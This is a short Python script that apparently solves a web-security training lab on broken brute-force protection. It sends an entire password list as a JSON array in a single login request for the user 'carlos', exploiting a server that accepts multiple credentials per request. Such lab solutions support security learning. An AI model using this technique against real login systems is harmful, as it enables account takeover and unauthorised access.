### LAB: Broken brute-force protection, multiple credentials per request

import requests
import json

# Read password list
with open('password.txt', 'r') as file:
  passwords = [line.rstrip() for line in file]

############################################################################

# URL LAB ID
url = 'https://0a8900c3040aa7508254dde400cd002a.web-security-academy.net'

session = requests.Session()
data = {
  'username' : 'carlos',
  'password' : passwords 
}
json_data = json.dumps(data)
response = session.post(url=url + '/login', data=json_data)

print(response.text)
